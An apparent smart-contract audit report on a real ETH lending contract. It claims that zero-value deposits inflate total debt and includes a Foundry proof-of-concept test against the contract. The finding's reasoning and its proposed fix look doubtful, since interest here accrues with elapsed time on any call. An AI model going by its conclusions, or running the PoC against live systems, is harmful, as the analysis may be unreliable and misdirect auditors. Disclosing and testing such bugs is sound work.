## Audit Report
Project:`Alpha Venture DAO`  
Researcher:`Aiden`
Date:`2025/12/24`

---


## Title 

**Increasing Total Debt Without Any Real Funds**

---

##  Report Type

`Smart Contract`   
`Lending`  
`On-chain`   
`Staking`  
`Finance Protocol`  


---

##  Target 
- `Address`:  https://etherscan.io/address/0x67b66c99d3eb37fa76aa3ed1ff33e8e39f0b9c7a

- `Asset`: Bank.sol 

- `Affected Functions`:  deposit()  -->   pendingInterest()  -->  work()

## Summary
 A user can, without sending any actual funds, call the `deposit()` function and exploit the interest logic to artificially increase the system’s total debt `glbDebtVal`
 this can disrupt calculations of position and debt states, and occurs due to `insufficient input validation` in the function


---
## Rating

Severity: `Medium`

Impact: `Medium`

Likelihood:`High` 

Attack Complexity :`Low`


---
## Analysis

- ``Preconditions for the bug:``none  
- ``Bug triggered by:``any external user  
- ``Amount at risk:``impact depends on how much artificial debt is generated  
- ``Who is affected (users, protocol, etc.):`protocol and  user 
- ``Impact:`` 
interest is accrued without any real capital being introduced
artificial inflation of the system’s total debt (glbDebtVal)
disruption of position health calculations




---
## Description


**Explain Contract/Function First**
 `Bank` contract is an ETH lending and deposit protocol where users can deposit their ETH and receive `ibETH` tokens in return.
 and There is a function `deposit()` that is used to deposit tokens.
Its state is updated by the `accrue` modifier
**Vulnerability**
when `msg.value = 0`

```solidity
modifier accrue(uint256 msgValue) {
    if (block.timestamp > lastAccrueTime) {
        uint256 interest = pendingInterest(msgValue); // Interest is calculated based on the current glbDebtVal
        uint256 toReserve = interest.mul(config.getReservePoolBps()).div(10000);
        reservePool = reservePool.add(toReserve);    // Bank's reserve increases
        glbDebtVal = glbDebtVal.add(interest);       // Total debt increases
        lastAccrueTime = block.timestamp;
    }
    _;
}

```
`pendingInterest(0)` still calculates interest based on the `current glbDebtVal`.

**some root impact**
`glbDebtVal`
when glbDebtVal increases artificially:

debt calculations per position (via debtShareToVal and debtValToShare) to be incorrect.

Indirectly, it can affect interest calculations or FANDI allocations for positions.

 system perceives the total debt as higher than it actually is, causing shares of profits/losses for real positions to be miscalculated.



`reservePool`

artificial increases cause `totalETH` to be miscalculated:
```solidity
function totalETH() public view returns (uint256) {
    return address(this).balance.add(glbDebtVal).sub(reservePool);
}
```


`work()`
Since position debt is calculated using `glbDebtVal` and debtShareToVal, artificial increases in `glbDebtVal` affect position debt, minDebtSize checks, and workFactor validations.


`deposit()  & withdraw()`
minted and burned token amounts depend on `totalETH`, which is influenced by `reservePool`

---
##  Vulnerability Details

In the `deposit()` function, the `accrue modifier` executes before any deposit and updates the contract’s state. the main issue is that this modifier `does not enforce any check on the input amount msg.value` Consequently:

```solidity

    function deposit() external payable accrue(msg.value) nonReentrant {
        uint256 total = totalETH().sub(msg.value);
        uint256 share = total == 0 ? msg.value : msg.value.mul(totalSupply()).div(total);
        _mint(msg.sender, share);
    }

//Both glbDebtVal and reservePool are increased artificially
   modifier accrue(uint256 msgValue) {
        if (block.timestamp > lastAccrueTime) {
            uint256 interest = pendingInterest(msgValue);
            uint256 toReserve = interest.mul(config.getReservePoolBps()).div(10000); 
            reservePool = reservePool.add(toReserve);
            glbDebtVal = glbDebtVal.add(interest);
            lastAccrueTime = block.timestamp;
        }
        _;
    }


```

---
## How to fix it (Recommended)

fix is to add an `input check in the accrue modifier` to prevent users from creating interest without depositing actual assets.

add require
```solidity
modifier accrue(uint256 msgValue) {
    require(msgValue > 0, "Deposit value must be greater than zero"); //here
    if (block.timestamp > lastAccrueTime) {
        uint256 interest = pendingInterest(msgValue);
        uint256 toReserve = interest.mul(config.getReservePoolBps()).div(10000);
        reservePool = reservePool.add(toReserve);
        glbDebtVal = glbDebtVal.add(interest);
        lastAccrueTime = block.timestamp;
    }
    _;
}

```
---

##  References
* Alpha Homora v1 (ETH)
* Bank
* https://etherscan.io/address/0x67b66c99d3eb37fa76aa3ed1ff33e8e39f0b9c7a
* deposit()  --> pendingInterest()
---
##  Proof of Concept (PoC)


for run test download from github 👇🏽
``

**Step by Step**



```solidity 

// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "forge-std/Test.sol";    
import "forge-std/console.sol"; 
import "../src/Bank.sol";

/**
Note flow
 We have three users 
 User 1 and User 2 deposit normal amounts for initial setup
 User 3 deposits zero, then we check the status of these two variables before and after user 3's call
glbDebtVal, reservePool
*/
// mock config just for compilation
contract config {
    function workFactor(address, uint256) external pure  returns (uint256) { return 10000; }
    function minDebtSize() external pure  returns (uint256) { return 1 ether; }
    function acceptDebt(address) external pure  returns (bool) { return true; }
    function isGoblin(address) external pure  returns (bool) { return true; }
    function killFactor(address, uint256) external pure  returns (uint256) { return 10000; }
    function getReservePoolBps() external pure  returns (uint256) { return 1000; }
    function getInterestRate(uint256, uint256) external pure  returns (uint256) { return 1e16; }
}

// mock goblin just for compilation
contract gablin  {
    function health(uint256) external pure  returns (uint256) { return 100 ether; }
    function work(uint256, address, uint256, bytes calldata) external payable  {}
}


contract TestBank is Test {
    Bank bnk;

    config conf;
    gablin gob;

    address user1=address(0x001); 
    address user2=address(0x002);
    address user3=address(0x004); // This is the user who sends zero 
    function setUp() public {
        conf=new config();
        gob=new gablin();
        bnk=new Bank(BankConfig(address(conf)));

        ///@notice Here we provide initial amounts, meaning we initialize the protocol just to have the normal code flow
        ///@dev onlyEOA modifire It is commented .  because simulating it would require creating a wrapper contract, which would make things messy. ۰۰۰۰۰> It also has no impact on the logic of the bug.

        // user 1 
        vm.deal(address(user1),80 ether);
        vm.prank(user1);
        bnk.deposit{value:80 ether}();
        vm.prank(user1);
        bnk.work(0,address(gob),40 ether ,41 ether ,bytes(""));



        //delay
        vm.warp(block.timestamp + 864000); // 10 days



        // user 2
        vm.deal(address(user2),20 ether);
        vm.prank(user2);
        bnk.deposit{value:20 ether}();
        vm.prank(user2);
        bnk.work(0,address(gob),5 ether ,6 ether ,bytes(""));
    }


    function test_InputValidation() public {
        // advance time 
        vm.warp(block.timestamp+864000); // 10 days 

        ///@notice Get the values of these two variables before user 3
        console.log("glbDebtVal before =",bnk.glbDebtVal());
        console.log("reservePool before =",bnk.reservePool());

        vm.prank(user3);
        bnk.deposit{value:0 ether}();
        
        console.log("after that");
        // Get the values of these two variables after that
        console.log("glbDebtVal after =",bnk.glbDebtVal());
        console.log("reservePool after =",bnk.reservePool());
    }
}


```








